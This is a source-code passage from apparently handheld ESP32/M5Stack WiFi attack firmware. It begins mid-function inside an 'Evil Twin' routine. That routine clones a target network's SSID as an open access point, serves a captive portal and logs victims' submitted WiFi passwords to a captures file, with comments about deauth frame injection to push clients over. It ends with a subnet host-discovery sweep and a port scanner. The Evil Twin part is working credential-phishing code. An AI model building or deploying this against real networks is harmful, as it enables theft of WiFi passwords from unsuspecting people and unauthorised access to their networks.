    tm.add("< Back", "");
    tm.draw();

    int target = -1;
    while (target < 0) {
        M5.update();
        if (M5.BtnA.wasPressed()) tm.scroll_down();
        if (M5.BtnB.wasPressed()) {
            int sel = tm.selected();
            if (sel == et_count) return;
            target = et_idx[sel];
        }
        if (M5.BtnB.pressedFor(LONG_PRESS_MS)) return;
        delay(10);
    }

    s_captured_pass = "";

    // ── Spin up clone AP (open, visible, same channel) ─────────
    // IMPORTANT: go through WIFI_OFF before entering AP mode.
    // Scan leaves the radio in WIFI_STA/idle; jumping directly to WIFI_AP
    // from WIFI_STA causes the AP stack to start with stale STA channel
    // state — the AP interface initialises on channel 1 (driver default)
    // regardless of the channel passed to softAP().  The SSID then either
    // doesn't appear in nearby scans or appears on the wrong channel.
    // Passing through WIFI_OFF forces a full radio teardown and gives the
    // AP a clean slate.
    WiFi.persistent(false);
    WiFi.disconnect(true);           // disconnect STA & turn off radio
    WiFi.mode(WIFI_OFF);
    delay(150);
    WiFi.mode(WIFI_AP);
    delay(50);
    // Use "" (not nullptr) — the Arduino lib treats nullptr as "keep current
    // auth" and may leave WPA2 from a prior softAP; "" correctly triggers
    // WIFI_AUTH_OPEN on the new AP interface.
    // NOTE: do NOT call esp_wifi_set_channel() after this.
    // softAP() already owns channel management for the AP interface.
    // Calling esp_wifi_set_channel() on a running soft-AP resets the
    // beacon engine and can silently stop the SSID from being advertised.
    bool ap_ok = WiFi.softAP(s_nets[target].ssid, "",
                             s_nets[target].channel, /*hidden=*/0);
    delay(500);  // let the AP stack fully initialise and send first beacons
    esp_wifi_set_max_tx_power(82);   // 20.5 dBm — ESP32-S3 hardware max

    // ── Diagnostic screen (shows for 4 s) ─────────────────────
    // softAP() returning true does NOT guarantee the SSID is on air.
    // Check the AP IP: 192.168.4.1 = driver actually started beaconing;
    //                  0.0.0.0    = driver silently failed.
    {
        IPAddress apIP = WiFi.softAPIP();
        bool ip_ok = (apIP != IPAddress(0,0,0,0));
        display_clear();
        draw_header("Evil Twin");
        M5.Lcd.setTextSize(1);
        M5.Lcd.setCursor(4, CONTENT_Y + 2);
        M5.Lcd.setTextColor(ap_ok ? CLR_SUCCESS : CLR_ERR, CLR_BG);
        M5.Lcd.printf("AP init: %s", ap_ok ? "OK" : "FAIL");
        M5.Lcd.setCursor(4, CONTENT_Y + 14);
        M5.Lcd.setTextColor(ip_ok ? CLR_SUCCESS : CLR_ERR, CLR_BG);
        M5.Lcd.printf("AP IP:   %s", apIP.toString().c_str());
        M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
        M5.Lcd.setCursor(4, CONTENT_Y + 26);
        M5.Lcd.printf("SSID: %.18s", s_nets[target].ssid);
        M5.Lcd.setCursor(4, CONTENT_Y + 38);
        M5.Lcd.printf("Ch: %d", s_nets[target].channel);
        draw_footer("", "B:abort");

        if (!ap_ok || !ip_ok) {
            M5.Lcd.setCursor(4, CONTENT_Y + 52);
            M5.Lcd.setTextColor(CLR_ERR, CLR_BG);
            M5.Lcd.print("FAILED — press B to exit");
            while (!M5.BtnB.wasPressed() && !M5.BtnB.pressedFor(LONG_PRESS_MS)) {
                M5.update(); delay(20);
            }
            WiFi.mode(WIFI_OFF);
            return;
        }
        // AP is genuinely up — show info for 4 s then continue
        uint32_t t0 = millis();
        while (millis() - t0 < 4000) {
            M5.update();
            if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) {
                WiFi.mode(WIFI_OFF);
                return;
            }
            delay(20);
        }
    }

    // ── Captive portal (identical to Evil Portal) ───────────────
    if (s_server) { delete s_server; s_server = nullptr; }
    s_server = new AsyncWebServer(80);
    s_server->on("/generate_204",        HTTP_GET,
        [](AsyncWebServerRequest* r){ r->redirect("http://192.168.4.1/"); });
    s_server->on("/hotspot-detect.html", HTTP_GET,
        [](AsyncWebServerRequest* r){ r->redirect("http://192.168.4.1/"); });
    s_server->on("/", HTTP_GET,
        [](AsyncWebServerRequest* r){ r->send(200, "text/html", PORTAL_HTML); });
    s_server->on("/capture", HTTP_POST, [](AsyncWebServerRequest* r) {
        if (r->hasParam("pass", true))
            s_captured_pass = r->getParam("pass", true)->value();
        r->send(200, "text/html", PORTAL_OK_HTML);
    });
    s_server->onNotFound(
        [](AsyncWebServerRequest* r){ r->redirect("http://192.168.4.1/"); });
    s_server->begin();

    display_clear();
    draw_header("Evil Twin");
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 2);
    M5.Lcd.printf("SSID: %.18s", s_nets[target].ssid);
    M5.Lcd.setCursor(4, CONTENT_Y + 14);
    M5.Lcd.printf("Ch: %d  Clients: waiting...", s_nets[target].channel);
    M5.Lcd.setTextColor(CLR_WARN, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 26);
    M5.Lcd.print("Tip: use ext. deauth!");
    draw_footer("", "B:stop");

    // DEAUTH DISABLED — diagnostic build to confirm AP beacons cleanly.
    // Broadcast deauth frames (DA=FF:FF:FF:FF:FF:FF) injected via WIFI_IF_AP
    // are received back by the same radio on the same channel.  The WiFi
    // driver may process its own looped-back management frames and reset the
    // beacon engine, silencing the SSID.  Confirm beacon first; re-enable
    // deauth once the SSID is visible in scans.
    uint32_t total_da = 0;
    uint32_t t_disp   = 0;

    while (true) {
        M5.update();
        uint32_t now = millis();

        // Refresh display at 3 Hz
        if (now - t_disp >= 330) {
            t_disp = now;
            M5.Lcd.fillRect(0, CONTENT_Y + 38, DISP_W, CONTENT_H - 40, CLR_BG);
            M5.Lcd.setTextSize(1);
            M5.Lcd.setTextColor(CLR_PRIMARY, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 40);
            M5.Lcd.printf("Clients: %d",
                          WiFi.softAPgetStationNum());

            if (s_captured_pass.length() > 0) {
                M5.Lcd.setTextColor(CLR_SUCCESS, CLR_BG);
                M5.Lcd.setCursor(4, CONTENT_Y + 56);
                M5.Lcd.print("CAPTURED:");
                M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
                M5.Lcd.setCursor(4, CONTENT_Y + 68);
                M5.Lcd.printf("%.30s", s_captured_pass.c_str());

                // Persist to SPIFFS /captures/evil_twin.txt
                if (SPIFFS.begin(false)) {
                    File f = SPIFFS.open("/captures/evil_twin.txt", "a");
                    if (f) {
                        f.printf("SSID:%s PASS:%s\n",
                                 s_nets[target].ssid,
                                 s_captured_pass.c_str());
                        f.close();
                    }
                }
                s_captured_pass = "";
            }
        }

        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) break;
        delay(10);
    }

    s_server->end();
    delete s_server; s_server = nullptr;
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
}

// ─── Network Scanner ──────────────────────────────────────────
// Connects to a WiFi network (open → direct; secured → password from
// SPIFFS /wifi/creds.txt as "SSID:PASSWORD" lines), then offers:
//   • My Info      — IP / GW / DNS / RSSI
//   • Host Discovery — TCP probe sweep of x.x.x.1-254 on port 80
//   • Port Scan    — 18 common ports on a selected host
//   • Disconnect

static IPAddress s_ns_hosts[64];
static int       s_ns_host_count = 0;
static char      s_ns_last_fname[28];  // /captures/ns_XXXXXX.txt

// Read the saved password for 'ssid' from SPIFFS /wifi/creds.txt.
// Returns empty String if file absent or SSID not found.
static String _wifi_saved_pass(const char* ssid) {
    if (!SPIFFS.begin(false)) return "";
    File f = SPIFFS.open("/wifi/creds.txt", "r");
    if (!f) return "";
    while (f.available()) {
        String line = f.readStringUntil('\n');
        line.trim();
        int colon = line.indexOf(':');
        if (colon > 0 && line.substring(0, colon) == ssid) {
            String p = line.substring(colon + 1);
            f.close();
            return p;
        }
    }
    f.close();
    return "";
}

// Port scan 18 common services on 'target'; blocks until done or B pressed.
static const struct { uint16_t port; const char* name; } NS_PORTS[] = {
    { 21,   "FTP   " }, { 22,   "SSH   " }, { 23,   "Telnet" },
    { 25,   "SMTP  " }, { 53,   "DNS   " }, { 80,   "HTTP  " },
    { 110,  "POP3  " }, { 135,  "RPC   " }, { 139,  "NetBIO" },
    { 143,  "IMAP  " }, { 443,  "HTTPS " }, { 445,  "SMB   " },
    { 3306, "MySQL " }, { 3389, "RDP   " }, { 5000, "UPnP  " },
    { 8080, "HTTP+ " }, { 8443, "HTTPS+" }, { 9100, "Print " },
};
static constexpr int NS_PORT_COUNT = 18;

// ICMP ping via raw socket — hits every host regardless of open ports.
// Falls back to TCP probe if ping fails (some APs block ICMP).
#include <lwip/sockets.h>

static uint16_t _icmp_cksum(const uint8_t* data, size_t len) {
    uint32_t sum = 0;
    for (size_t i = 0; i + 1 < len; i += 2)
        sum += ((uint16_t)data[i] << 8) | data[i+1];
    if (len & 1) sum += (uint16_t)data[len-1] << 8;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

static bool _ns_ping_once(IPAddress tgt) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s < 0) return false;

    struct timeval tv = {0, 150000};  // 150 ms recv timeout
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = (uint32_t)tgt;

    // Build minimal ICMP echo request (20 bytes)
    uint8_t pkt[20]{};
    pkt[0] = 8;            // type: echo request
    pkt[1] = 0;            // code
    pkt[4] = 0x12; pkt[5] = 0x34;  // id
    pkt[6] = 0x00; pkt[7] = 0x01;  // seq
    uint16_t ck = _icmp_cksum(pkt, sizeof(pkt));
    pkt[2] = ck >> 8; pkt[3] = ck & 0xFF;

    sendto(s, pkt, sizeof(pkt), 0, (struct sockaddr*)&dst, sizeof(dst));

    uint8_t buf[64];
    socklen_t slen = sizeof(dst);
    int r = recvfrom(s, buf, sizeof(buf), 0, (struct sockaddr*)&dst, &slen);
    close(s);
    // ICMP reply type=0 sits at offset 20 (after IP header)
    return (r >= 28 && buf[20] == 0);
}

// Try ICMP first; fall back to TCP on a few common ports.
static bool _ns_is_alive(IPAddress tgt) {
    if (_ns_ping_once(tgt)) return true;
    // Fallback: some routers block ICMP but allow TCP
    static const uint16_t PROBES[] = {80, 443, 22, 445, 8080, 5353, 8888};
    for (uint16_t port : PROBES) {
        WiFiClient c;
        if (c.connect(tgt, port, 80)) { c.stop(); return true; }
        c.stop();
    }
    return false;
}

static void _ns_port_scan(IPAddress target) {
    char ip_str[20];
    snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
             target[0], target[1], target[2], target[3]);

    display_clear();
    draw_header(ip_str);
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 2);
    M5.Lcd.print("Scanning ports...");
    draw_footer("", "B:abort");

    uint16_t    open_port[NS_PORT_COUNT];
    const char* open_name[NS_PORT_COUNT];
    int         open_cnt = 0;
    bool        aborted  = false;

    for (int i = 0; i < NS_PORT_COUNT && !aborted; i++) {
        M5.update();
        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) {
            aborted = true;
            break;
        }

        M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
        M5.Lcd.setCursor(4, CONTENT_Y + 2);
        M5.Lcd.printf("Scanning %s (%d)...  ", NS_PORTS[i].name, NS_PORTS[i].port);

        WiFiClient c;
        bool is_open = c.connect(target, NS_PORTS[i].port, 300);
        c.stop();

        if (is_open) {
            open_port[open_cnt] = NS_PORTS[i].port;
            open_name[open_cnt] = NS_PORTS[i].name;
            open_cnt++;

            // Redraw live open-port list (up to 5 visible)
            M5.Lcd.fillRect(0, CONTENT_Y + 14, DISP_W, CONTENT_H - 16, CLR_BG);
            M5.Lcd.setTextColor(CLR_SUCCESS, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 16);
            M5.Lcd.print("OPEN:");
            for (int j = 0; j < open_cnt && j < 5; j++) {
                M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
                M5.Lcd.setCursor(4, CONTENT_Y + 28 + j * 13);
                M5.Lcd.printf("  %5d  %s", open_port[j], open_name[j]);
            }
        }
    }

    if (open_cnt == 0 && !aborted) {
        M5.Lcd.fillRect(0, CONTENT_Y + 14, DISP_W, CONTENT_H - 16, CLR_BG);
        M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
        M5.Lcd.setCursor(4, CONTENT_Y + 30);
        M5.Lcd.print("No open ports found.");
    }

    M5.Lcd.setTextColor(CLR_ACCENT, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + CONTENT_H - 10);
    M5.Lcd.printf("Done: %d open  [B=back]", open_cnt);

    // Append port-scan results to the netscan results file
    if (s_ns_last_fname[0] && SPIFFS.begin(false)) {
        File pf = SPIFFS.open(s_ns_last_fname, "a");
        if (pf) {
            pf.printf("\n--- Port scan %s ---\n", ip_str);
            if (aborted) pf.printf("(aborted)\n");
            else if (open_cnt == 0) pf.printf("No open ports\n");
            else for (int j = 0; j < open_cnt; j++)
                pf.printf("  %5d  %s\n", open_port[j], open_name[j]);
            pf.close();
        }
    }

    delay(300);
    M5.update();
    while (!M5.BtnB.wasPressed() && !M5.BtnB.pressedFor(LONG_PRESS_MS)) {
        M5.update();
        delay(10);
    }
}

// Host-discovery sweep: TCP probe to port 80 on every x.x.x.1-254.
// A successful connection marks the host alive.  Stored in s_ns_hosts[].
static void _ns_host_discovery() {
    s_ns_host_count = 0;
    IPAddress local = WiFi.localIP();

    display_clear();
    draw_header("Host Discovery");
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 2);
    M5.Lcd.printf("Subnet: %d.%d.%d.0/24",
                  local[0], local[1], local[2]);
    draw_footer("", "B:abort");

    for (int i = 1; i <= 254; i++) {
        M5.update();
        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) break;

        if (i == (int)local[3]) continue;

        IPAddress tgt(local[0], local[1], local[2], (uint8_t)i);
        if (_ns_is_alive(tgt) && s_ns_host_count < 64)
            s_ns_hosts[s_ns_host_count++] = tgt;

        // Progress bar
        int bar_w = (int)((DISP_W - 8) * i / 254);
        M5.Lcd.fillRect(4, CONTENT_Y + 14, bar_w, 6, CLR_PRIMARY);

        M5.Lcd.setTextColor(CLR_SUCCESS, CLR_BG);
        M5.Lcd.setCursor(4, CONTENT_Y + 26);
        M5.Lcd.printf("Found: %d  (%d/254)    ", s_ns_host_count, i);
    }

    // Save host list to /captures
    snprintf(s_ns_last_fname, sizeof(s_ns_last_fname),
             "/captures/ns_%06lu.txt", millis() % 1000000UL);
    if (s_ns_host_count > 0 && SPIFFS.begin(false)) {
        File hf = SPIFFS.open(s_ns_last_fname, "w");
        if (hf) {
            hf.printf("SSID  : %s\n", WiFi.SSID().c_str());
            hf.printf("Subnet: %d.%d.%d.0/24\n", local[0], local[1], local[2]);
            hf.printf("Hosts : %d\n\n", s_ns_host_count);
            for (int i = 0; i < s_ns_host_count; i++)
                hf.printf("  %d.%d.%d.%d\n",
                          s_ns_hosts[i][0], s_ns_hosts[i][1],
                          s_ns_hosts[i][2], s_ns_hosts[i][3]);
            hf.close();
        }
    }

    if (s_ns_host_count == 0) {
        show_message("Host Discovery",
                     "No hosts responded.\nTry Port Scan on GW.");
        delay(2200);
        return;
    }

    static char hl_lbl[64][20];
    Menu hm("Live Hosts");
    for (int i = 0; i < s_ns_host_count; i++) {
        snprintf(hl_lbl[i], sizeof(hl_lbl[i]),
                 "%d.%d.%d.%d",
                 s_ns_hosts[i][0], s_ns_hosts[i][1],
                 s_ns_hosts[i][2], s_ns_hosts[i][3]);
        hm.add(hl_lbl[i], ">");
    }
    hm.add("< Back", "");
    delay(200);
    M5.update();
    hm.draw();

    while (true) {
        M5.update();
        if (M5.BtnA.wasPressed()) hm.scroll_down();
        if (M5.BtnB.wasPressed()) {
            int sel = hm.selected();
            if (sel == s_ns_host_count) break;
            _ns_port_scan(s_ns_hosts[sel]);
            hm.draw();
        }
        if (M5.BtnB.pressedFor(LONG_PRESS_MS)) break;
        delay(10);
    }
}

void wifi_network_scanner_run() {
    // ── Step 1: connect ───────────────────────────────────────
    if (WiFi.status() != WL_CONNECTED) {
        if (s_net_count == 0) {
            show_message("Net Scanner",
                         "Run WiFi Scan first\nto see networks.");
            delay(1800);
            return;
        }

        static char ns_lbl[WIFI_MAX_NETS][40];
        Menu cm("Connect To");
        for (int i = 0; i < s_net_count; i++) {
            const char* lock =
                (s_nets[i].authmode == WIFI_AUTH_OPEN) ? " " : "*";
            snprintf(ns_lbl[i], sizeof(ns_lbl[i]),
                     "%s%-18.18s Ch%d", lock,
                     s_nets[i].ssid, s_nets[i].channel);
            cm.add(ns_lbl[i], "");
        }
        cm.add("< Back", "");
        cm.draw();

        int net_sel = -1;
        while (net_sel < 0) {
            M5.update();
            if (M5.BtnA.wasPressed()) cm.scroll_down();
            if (M5.BtnB.wasPressed()) {
                int s = cm.selected();
                if (s == s_net_count) return;
                net_sel = s;
            }
            if (M5.BtnB.pressedFor(LONG_PRESS_MS)) return;
            delay(10);
        }

        display_clear();
        draw_header("Connecting...");
        M5.Lcd.setTextSize(1);
        M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
        M5.Lcd.setCursor(4, CONTENT_Y + 2);
        M5.Lcd.printf("SSID: %.22s", s_nets[net_sel].ssid);

        WiFi.persistent(false);
        WiFi.mode(WIFI_STA);

        if (s_nets[net_sel].authmode == WIFI_AUTH_OPEN) {
            M5.Lcd.setCursor(4, CONTENT_Y + 16);
            M5.Lcd.print("Open network...");
            WiFi.begin(s_nets[net_sel].ssid);
        } else {
            String pass = _wifi_saved_pass(s_nets[net_sel].ssid);
            if (pass.length() == 0) {
                display_clear();
                draw_header("No Password");
                M5.Lcd.setTextSize(1);
                M5.Lcd.setTextColor(CLR_WARN, CLR_BG);
                M5.Lcd.setCursor(4, CONTENT_Y + 2);
                M5.Lcd.print("Add to SPIFFS:");
                M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
                M5.Lcd.setCursor(4, CONTENT_Y + 16);
                M5.Lcd.print("/wifi/creds.txt");
                M5.Lcd.setCursor(4, CONTENT_Y + 30);
                M5.Lcd.print("Format: SSID:PASS");
                draw_footer("", "B:back");
                delay(200);
                M5.update();
                while (!M5.BtnB.wasPressed() &&
                       !M5.BtnB.pressedFor(LONG_PRESS_MS)) {
                    M5.update();
                    delay(10);
                }
                return;
            }
            M5.Lcd.setCursor(4, CONTENT_Y + 16);
            M5.Lcd.print("Password found, joining...");
            WiFi.begin(s_nets[net_sel].ssid, pass.c_str());
        }

        uint32_t t_conn = millis();
        while (WiFi.status() != WL_CONNECTED && millis() - t_conn < 10000) {
            M5.Lcd.setTextColor(CLR_ACCENT, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 32);
            M5.Lcd.printf("%.1f s...  ", (millis() - t_conn) / 1000.0f);
            delay(200);
        }

        if (WiFi.status() != WL_CONNECTED) {
            show_message("Connect Failed",
                         "Check credentials\nor signal strength.",
                         CLR_ERR);
            delay(2000);
            WiFi.disconnect(false);
            WiFi.mode(WIFI_OFF);
            return;
        }
    }

    // ── Step 2: scanner sub-menu ──────────────────────────────
    while (true) {
        IPAddress gw = WiFi.gatewayIP();

        Menu sm("Net Scanner");
        sm.add("My Info",        "I");
        sm.add("Host Discovery", "H");
        sm.add("Port Scan",      "P");
        sm.add("Disconnect",     "D");
        sm.add("< Back",         " ");
        sm.draw();

        int choice = -1;
        while (choice < 0) {
            M5.update();
            if (M5.BtnA.wasPressed()) sm.scroll_down();
            if (M5.BtnB.wasPressed()) choice = sm.selected();
            if (M5.BtnB.pressedFor(LONG_PRESS_MS)) {
                WiFi.disconnect(false);
                WiFi.mode(WIFI_OFF);
                return;
            }
            delay(10);
        }

        if (choice == 0) {
            // My Info
            display_clear();
            draw_header("My Info");
            M5.Lcd.setTextSize(1);
            M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 2);
            M5.Lcd.printf("IP:   %s", WiFi.localIP().toString().c_str());
            M5.Lcd.setCursor(4, CONTENT_Y + 14);
            M5.Lcd.printf("GW:   %s", gw.toString().c_str());
            M5.Lcd.setCursor(4, CONTENT_Y + 26);
            M5.Lcd.printf("DNS:  %s", WiFi.dnsIP().toString().c_str());
            M5.Lcd.setCursor(4, CONTENT_Y + 38);
            M5.Lcd.printf("RSSI: %d dBm", WiFi.RSSI());
            M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 52);
            M5.Lcd.printf("SSID: %.20s", WiFi.SSID().c_str());
            draw_footer("", "B:back");
            delay(200);
            M5.update();
            while (!M5.BtnB.wasPressed() &&
                   !M5.BtnB.pressedFor(LONG_PRESS_MS)) {
                M5.update();
                delay(10);
            }

        } else if (choice == 1) {
            _ns_host_discovery();

        } else if (choice == 2) {
            // Port Scan — pick from discovered hosts or gateway
            static char ps_lbl[65][20];
            Menu pm("Port Scan");
            snprintf(ps_lbl[0], sizeof(ps_lbl[0]), "Gateway (%s)",
                     gw.toString().c_str());
            pm.add(ps_lbl[0], "G");
            for (int i = 0; i < s_ns_host_count; i++) {
                snprintf(ps_lbl[i + 1], sizeof(ps_lbl[i + 1]),
                         "%d.%d.%d.%d",
                         s_ns_hosts[i][0], s_ns_hosts[i][1],
                         s_ns_hosts[i][2], s_ns_hosts[i][3]);
                pm.add(ps_lbl[i + 1], ">");
            }
            pm.add("< Back", "");
            delay(200);
            M5.update();
            pm.draw();

            bool pm_done = false;
            while (!pm_done) {
                M5.update();
                if (M5.BtnA.wasPressed()) pm.scroll_down();
                if (M5.BtnB.wasPressed()) {
                    int sel = pm.selected();
                    if (sel == s_ns_host_count + 1) {
                        pm_done = true;
                    } else {
                        IPAddress tgt = (sel == 0) ? gw : s_ns_hosts[sel - 1];
                        _ns_port_scan(tgt);
                        pm.draw();
                    }
                }
                if (M5.BtnB.pressedFor(LONG_PRESS_MS)) pm_done = true;
                delay(10);
            }

        } else if (choice == 3) {
            WiFi.disconnect(false);
            WiFi.mode(WIFI_OFF);
            show_message("Disconnected", "");
            delay(800);
            return;

        } else {
            WiFi.disconnect(false);
            WiFi.mode(WIFI_OFF);
            return;
        }

        delay(350);
        M5.update();
    }
}
